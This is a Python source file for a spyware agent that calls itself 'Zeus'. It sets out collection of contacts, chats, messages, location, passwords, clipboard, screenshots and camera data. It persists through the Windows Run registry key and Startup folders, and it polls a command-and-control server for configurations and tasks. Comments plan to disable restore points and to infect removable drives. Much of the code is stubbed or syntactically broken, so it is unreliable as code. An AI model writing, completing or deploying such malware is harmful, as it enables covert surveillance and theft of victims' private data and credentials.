#!/usr/local/bin/python


# Compile with Python 3 only

import os
import os.path
import platform
import urllib.request
from shutil import copyfile
from threading import Thread

configurations = {}


class MainAgentProcess:
    def checkIfExists(self):
        print("[i] Zeus spyware is already installed.")

    def launchFromStartup(self):
        print("[i] Zeus spyware launched from startup.")

    def loadConfigurations(self):
        # Download configurations from Command & Control server
        socialConfigurations = {"addressbook": 1, "chat": 1, "messages": 1, "position": 1, "photo": 1, "file": 1,
                                "device": 1}
        configurations = {"social": socialConfigurations, "position": 1, "clipboard": 1, "password": 1, "screenshot": 1,
                          "camera": 1, "url": 1, "deviceInfo": 1}

        #
        # Device Info:
        # -------------
        # installed operating system version;
        # CPU architecture (32 or 64 bit);
        # RAM (used and installed);
        # installed applications;
        # info about the user logged in;
        # info about local date/hours.
        #

        # On error loading configurations, return false
        return True

        def initialize():
            print("Init stuff goes here")

        def startAndListen():
            print("Main programm & code goes here")

            startServices()

        def authenticateDeviceID():
            print("Authenticate device ID with server")

        def startServices():
            print("Start services in seperate threads according to configurations")

        def sendGetConfigurationsRequest():
            jsonResponse = urllib.request.urlopen(
                "http://192.168.0.102/control.php?task=getConfigurations&agent=zeus").read()

        def takeScreenshot():
            dataImagePrefix = "data:image/png;base64,"
            base64Image = ""

        # Check if agents exists on device, if not - immidiatly copy itself to system boot/run

        isZeusExists = checkIfExists()
        if not isZeusExists:
            bootHandler = SystemBootHandler()
            bootHandler.addSelfToSystemToBoot()

        didLoadConfSuccfully = loadConfigurations()
        if didLoadConfSuccfully:
            initialize()
            startAndListen()

class SystemBootHandler:
    WINDOWS_START_UP_FOLDER_PREFIX = ""
    WINDOWS_START_UP_FOLDER_SUFFIX = r"\Start Menu\Programs\StartUp"
    WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX = r"\AppData\Roaming\Microsoft\Windows\Start"

    START_MENU = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

    WINDOWS_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
    WINDOWS_ALTERNATIVE_REGISTRY_START_UP_PATH = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"

    isWindows = False

    @staticmethod
    def addSelfToSystemToBoot(self, isWindows=None):
        if isWindows:
            # 1. Use registry
            self.implantToRegistry()

            # 2. Copy file manually
            copyFilesManually()

        # 3. Disable restore points
        # 4. Disable windows services which can interfer propy injection to device
        # 5. Constantly check if removable devices is connected and if yes -
            # infect them as well (make spyware startup from removable device)

    @staticmethod
    def implantToRegistry(self):
        global CheckRegistryKey, keyCheck, setRegistryValue
        try:
            registryKey = CheckRegistryKey(WINDOWS_REGISTRY_START_UP_PATH, "Zeus", os.path.abspath(__file__))
            if registryKey:
                keyCheck = registryKey[0]

            if keyCheck == 1:
                print("Zeus already installed!")
            else:
                print("Implanting Zeus to windows registry")

            didSetRunKey = setRegistryValue(WINDOWS_REGISTRY_START_UP_PATH, os.path.abspath(__file__))

            if not didSetRunKey:
                print("Error adding Zeus to windows registry run key.")
        except ex:
            print(ex)

        def setRegistryValue(name, value):
            try:
                winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
                registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
                winreg.CloseKey(registry_key)

                return True
            except WindowsError:
                return False

        def CheckRegistryKey(location, softwareName, keyName):
            try:
                aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
                aKey = OpenKey(aReg, location)
            except ex:
                print(ex)
                return False

        try:
            aSubKey = OpenKey(aKey, softwareName)
            val = QueryValueEx(aSubKey, keyName)

            if val:
                return True
            else:
                return False

            except EnvironmentError:
                return False

        def copyFilesManually():
            # Copy to 1st directory
            destinationFolder = r"%s%s" % (WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_START_UP_FOLDER_SUFFIX)
            filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))

            if not os.path.isfile(filePath):
                copyfile(os.path.abspath(__file__), destinationFolder)

            # Copy to 2nd directory
            destinationFolder = r"%s%s" % (
            WINDOWS_START_UP_FOLDER_PREFIX, WINDOWS_ALTERNATIVE_START_UP_FOLDER_SUFFIX)
            filePath = r"%s\%s" % (destinationFolder, os.path.abspath(__file__))

            if not os.path.isfile(filePath):
                copyfile(os.path.abspath(__file__), destinationFolder)

        isWindows = (platform.system().lower() == "Windows".lower())

        if isWindows:
            import winreg

            WINDOWS_START_UP_FOLDER_PREFIX = os.environ['WINDIR']

class DeviceInfoProvider:
    def getDeviceInfo(self):
        if platform.system().lower() == "Darwin".lower():
            print("OS: Mac OS X")
        elif platform.system().lower() == "Linux".lower():
            print("OS: Linux")
        elif platform.system().lower() == "Windows".lower():
            print("OS: Windows")

class TaskManagmentProvider:
    # Handle tasks from server

    MINUTES_TO_FIRST_TASK = 5
    MINUTES_TO_NORMAL_TASK = 20
    MINUTES_TO_FAILED_TASK = 20

def startNewTask():
    thread = Thread(target=executeTaskFromServer, args=())
    thread.start()

def executeTaskFromServer():
    taskResponse = urllib.request.urlopen("http://192.168.0.102/control.php?task=getTask&agent=zeus").read()
